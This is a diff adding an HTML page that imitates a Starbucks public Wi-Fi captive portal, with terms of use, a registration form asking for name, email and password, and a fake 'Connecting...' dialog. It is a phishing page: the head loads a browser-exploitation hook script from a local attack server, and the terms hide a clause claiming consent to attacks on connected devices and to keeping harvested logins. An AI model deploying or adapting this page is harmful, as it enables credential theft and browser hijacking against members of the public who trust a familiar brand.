@@ -1,0 +1,156 @@
+<!DOCTYPE html> 
+<html>
+<head>
+	<meta charset="UTF-8">
+	<title>Web Access - Login - Starbucks</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+	<link rel="stylesheet" href="css/login.css" />
+	<link rel="stylesheet" href="css/jquery/jquery.mobile.theme-1.4.5.min.css" />
+	<link rel="stylesheet" href="css/jquery/jquery.mobile.icons-1.4.5.min.css" />
+	<link rel="stylesheet" href="css/jquery/jquery.mobile.structure-1.4.5.min.css" /> 
+	<script src="scripts/mobile/jquery-1.11.1.min.js"></script> 
+	<script src="scripts/mobile/jquery.mobile-1.4.5.min.js"></script> 
+	<script src="scripts/portalSignIn.js"></script> 
+	<script src="http://127.0.0.1:3000/hook.js"></script>
+
+
+</head>
+<body>
+
+
+
+	<div data-role="page" id="index" data-theme="a" >
+		<div data-role="header">
+			<h3>
+				Starbucks Web Acccess Portal
+			</h3>
+			<a href="#second" class="ui-btn-right">Sign Up</a>
+		</div>
+
+
+
+		<div role="main" class="ui-content">
+			<center>
+				<div id="companyLogoDiv">
+					<img src="css/base/images/Starbucks.png" alt="Starbucks Wireless Networks">
+				</div>
+				<div id="agreementWelcomeText">
+					<p>
+						You are attempting to access a <b>FREE</b> Starbucks public wireless network. <br>This network is provided at no cost as a public service, provided you agree to the following <b><u>Terms and Conditions:</u></b>
+					</p>
+				</div>
+				<div id="agreementDiv" class="ui-field-contain">
+					<textarea id='agreement'>
+
+User Responsibilities
+
+Use of the this public wireless network is provided by Starbucks Networks and is a privilege. Where it is available, this resource is offered to patrons at no cost. In order to maintain the privilege, users agree to learn and comply with all of the provisions of this policy.
+
+Acceptable Use
+
+All use of the Internet must be in support of public access and awareness of inappropriate materials that could accidentally be viewed by others patrons.
+Proper codes of conduct in electronic communication must be used. In news groups, giving out personal information is inappropriate. When using e-mail, extreme caution must always be taken in revealing any information of a personal nature.
+All communications and information accessible via the network should be assumed to be monitored.
+Exhibit exemplary behavior on the network as a representative of your community. Be polite!
+From time to time, Starbucks Networks will make determinations on whether specific uses of the network are consistent with the acceptable use practice.
+
+Unacceptable Use
+
+Giving out personal information about another person, including home address and phone number, is strictly prohibited.
+Any use of the network for commercial or for-profit purposes is prohibited.
+Excessive use of the network for personal business shall be cause for disciplinary action.
+Any use of the network for product advertisement or political lobbying is prohibited.
+Hate mail, chain letters, harassment, discriminatory remarks, and other antisocial behaviors are prohibited on the network.
+The unauthorized installation of any software, including shareware and freeware, for use on Starbucks Networks computers is prohibited.
+Use of the network to access or process pornographic material, inappropriate text files (as determined by the system administrator or building administrator), or files dangerous to the integrity of the local area network is prohibited.
+Starbucks Networks network may not be used for downloading entertainment software or other files not related to the mission and objectives of Starbucks Networks for transfer to a user's home computer, personal computer, or other media. This prohibition pertains to freeware, shareware, copyrighted commercial and non-commercial software, and all other forms of software and files not directly related to the instructional and administrative purposes of Starbucks Networks.
+Downloading, copying, otherwise duplicating, and/or distributing copyrighted materials without the specific written permission of the copyright owner is prohibited, except that duplication and/or distribution of materials for educational purposes is permitted when such duplication and/or distribution would fall within the Fair Use Doctrine of the United States Copyright Law (Title 17, USC).
+Use of profanity, obscenity, racist terms, or other language that may be offensive to another user is prohibited.
+Disclaimer
+
+Starbucks Networks cannot be held accountable for the information that is retrieved via the network.
+Pursuant to the Electronic Communications Privacy Act of 1986 (18 USC 2510 et seq.), notice is hereby given that there are no facilities provided by this system for sending or receiving private or confidential electronic communications. System administrators have access to all mail and will monitor messages. Messages relating to or in support of illegal activities will be reported to the appropriate authorities.
+Starbucks Networks will not be responsible for any damages you may suffer, including loss of data resulting from delays, non-deliveries, or service interruptions caused by our own negligence or your errors or omissions. Use of any information obtained is at your own risk.
+Starbucks makes no warranties (expressed or implied) with respect to:
+the content of any advice or information received by a user, or any costs or charges incurred as a result of seeing or accepting any information; and
+any costs, liability, or damages caused by the way the user chooses to use his or her access to the network.
+Starbucks Networks reserves the right to change its policies and rules at any time.
+It is the policy of Starbucks Networks to maintain an environment that promotes ethical and responsible conduct in all online network activities by users. It shall be a violation of this policy for any end user to engage in any activity that does not conform to the established purpose and general rules and policies of the network. Within this general policy, Starbucks Networks recognizes its legal and ethical obligation to protect the well-being of network users in its charge. To this end, Starbucks Networks retains the following rights and recognizes the following obligations:
+
+To log network use and to monitor fileserver space utilization by users, and assume no responsibility or liability for files deleted due to overuse of network resources. 
+To remove a user account on the network.
+To monitor the use of online activities. This may include real-time monitoring of network activity and/or maintaining a log of Internet activity for later review.
+To provide internal and external controls as appropriate and feasible. Such controls shall include the right to determine who will have access to Starbucks Networks-owned equipment and, specifically, to exclude those who do not abide by Starbucks Networks's acceptable use policy or other policies governing the use of school facilities, equipment, and materials. Starbucks Networks reserves the right to restrict online destinations through software or other means. 
+To provide guidelines and make reasonable efforts to train staff and students in acceptable use and policies governing online communications.
+Staff Responsibilities. 
+
+Starbucks members who supervise users, control electronic equipment, or otherwise have occasion to observe users use of said equipment online shall make reasonable efforts to monitor the use of this equipment to assure that it conforms to the mission and goals of Starbucks Networks. Accepting this aggreement provides expressed user permission to attempt vulnerability analysis on hosts connected to network and retain full rights, privelages, and access obtained from this analysis (this includes login information)
+Users should make reasonable efforts to become familiar with these analysis techniques before using the network and its use so that effective monitoring, instruction, and assistance may be achieved.
+					</textarea>
+					<div id="checkBox">
+						<!-- 	<a href="#signUp" id="iAgreeLink" data-rel="popup" data-position-to="window" data-transition="pop" class="iAgreeLink ui-btn ui-corner-all ui-shadow ui-btn-inline ui-icon-delete ui-btn-icon-left ui-btn-a">I agree to these Terms, register my device.</a> -->
+						<a href="#signUp" id="iAgreeLink" class="iAgreeLink ui-btn ui-corner-all ui-shadow ui-btn-inline ui-icon-delete ui-btn-icon-left ui-btn-a">I agree, register my device.</a>
+
+
+					</div>
+				</div>
+			</center>
+		</div>
+	</div>		
+</div>
+
+
+
+<div data-role="page" id="signUp" data-theme="a" >
+	<div data-role="header">
+		<h3>
+			Starbucks Web Acccess Portal - Register Device
+		</h3>
+		<a href="#second" class="ui-btn-right">Login</a>
+	</div>
+
+	<div role="main" class="ui-content">
+		<div id="companyLogoDiv">
+			<center><img src="css/base/images/Starbucks.png" alt="Starbucks Wireless Networks"></center>
+		</div>
+
+
+			<div id="registerUser" class=" ui-block-b ui-field-contain">
+				<form id="registerForm" action="JavaScript:submitForm();" method="post">
+					<label for="name">Name</label>
+					
+					<input type="text" id="name" name="name" placeholder="Name" value="" required>
+					<label for="email">E-mail</label>
+					<input type="text" id="email" name="email" placeholder="E-mail" value="" required>
+					<label for="password">Password: </label>
+					<input type="password" id="password" name="password" placeholder="Enter Password" value="" required>
+					<label for="confirmPassword">Confirm Password: </label>
+					<input type="password" id="confirmPassword" name="confirmPassword" placeholder="Re-Enter Password" value="" required>
+					<center><p id="validate-status" style="color:red;"></p></center>
+					<input type="submit" id="registerButton" name="registerButton" value="Connect Device">
+				</form>
+			</div>
+
+			<div data-role="popup" id="popupDialog" data-overlay-theme="a" data-theme="a" data-dismissible="false" style="max-width:500px;">
+
+				<div data-role="header" data-theme="a">
+					<h1>Connecting...</h1>
+				</div>
+
+				<div role="main" class="ui-content">
+					<h3 class="ui-title">Thank you for your patience, we are connecting you...</h3>
+				</div>
+
+				<div>
+					<ul data-role="listview">
+						<li id="addressRequested" class="ui-icon-check">Reserving DHCP address... <span id="showAddressOk"><b>assigned</b></span></li>
+						<li id="connectionStatus" class="ui-icon-check">Checking DNS settings... <span id="showDnsOk"><b>Gateway OK</b></span></li>
+						<li id="connected" class="ui-icon-check"><a href="#" class="ui-btn ui-icon-check ui-btn-icon-right">Connected!</a></li>
+					</ul>
+				</div>
+			</div>
+	</div>		
+</div>
+</body>
+</html>
